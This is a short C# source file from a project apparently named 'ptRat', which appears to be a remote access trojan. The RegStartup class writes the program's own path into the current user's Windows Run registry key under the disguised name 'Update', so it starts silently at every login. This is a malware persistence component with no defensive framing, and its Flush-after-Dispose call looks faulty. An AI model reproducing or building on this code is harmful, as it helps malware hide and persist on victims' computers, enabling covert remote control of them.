using System;
using System.Reflection;
using Microsoft.Win32;

namespace ptRat.Lib
{
    internal class RegStartup
    {
        public RegStartup()
        {
            using (RegistryKey Reg = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true))
            {
                Reg.SetValue("Update", String.Format("\"{0}\"", Assembly.GetEntryAssembly().Location));
                Reg.Dispose();
                Reg.Flush();
            }
        }
    }
}
